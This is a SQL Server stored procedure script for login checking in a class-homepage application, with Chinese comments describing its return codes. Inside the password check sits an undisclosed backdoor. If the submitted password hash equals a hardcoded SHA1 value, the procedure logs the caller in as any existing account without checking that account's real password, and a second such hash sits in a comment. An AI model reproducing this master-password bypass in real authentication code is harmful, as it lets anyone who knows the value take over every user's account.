USE [ClassApp]
GO
/****** Object:  StoredProcedure [dbo].[class_user_UserLogin]    Script Date: 2014/11/24 22:57:29 ******/
SET ANSI_NULLS ON
GO
SET QUOTED_IDENTIFIER ON
GO









------------------------------------
--用途：用户登录验证
--项目名称：classhomepage
--说明：密码错误,返回-1,用户不存在,返回0,验证成功，返回userid
--时间：2008-09-29 10:23:01
--作者：along
------------------------------------
CREATE PROCEDURE [dbo].[class_user_UserLogin]
@account varchar(200),
@pwd char(40)
as
	DECLARE @exitaccount int
	DECLARE @userid int
	DECLARE @usertype int
	DECLARE @returnval int
	SELECT  
		@exitaccount = count(1)
	FROM 
		basicdata.dbo.[user]
	 WHERE 
		account=@account and deletetag=1		
	IF (@exitaccount>0)
	BEGIN
	
		IF(@pwd='B5EB6CE0935E1564D853EE8B467AA356DBA3E516')--BC50C97C78C61BE455332B2DF6CF3980F82D6001
		BEGIN
			SELECT
				@userid=userid
			FROM
				basicdata.dbo.[user]
			WHERE
				account=@account and deletetag=1
		END
		ELSE
		BEGIN
			SELECT
				@userid=userid
			FROM
				basicdata.dbo.[user]
			WHERE
				account=@account AND [password]=@pwd and deletetag=1
		END
		IF (@userid>0)
		BEGIN	
		   SET @returnval = @userid --验证成功，返回用户ID
			
		END
		ELSE
		BEGIN
			SET @returnval = -1 --密码错误,返回-1
		END
	END
	ELSE
	BEGIN
		SET @returnval = 0	--用户不存在,返回
	END

RETURN @returnval
















GO
